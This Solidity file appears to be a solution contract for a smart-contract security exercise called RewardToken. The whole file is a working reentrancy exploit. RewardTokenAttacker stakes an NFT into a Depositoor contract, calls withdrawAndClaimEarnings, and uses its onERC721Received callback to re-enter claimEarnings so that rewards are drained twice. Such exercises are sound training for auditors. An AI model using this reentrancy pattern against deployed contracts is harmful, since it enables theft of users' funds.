//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import { Depositoor, NftToStake } from "./RewardToken.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract RewardTokenAttacker is IERC721Receiver {
  Depositoor public depositoor;

  function stake(address _depositoor, address nft) public payable {
    depositoor = Depositoor(_depositoor);

    NftToStake(nft).safeTransferFrom(address(this), _depositoor, 42);
  }

  function attack() public payable {
    depositoor.withdrawAndClaimEarnings(42);
  }

  function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external override returns (bytes4) {
        depositoor.claimEarnings(tokenId);

        return IERC721Receiver.onERC721Received.selector;
    }
}
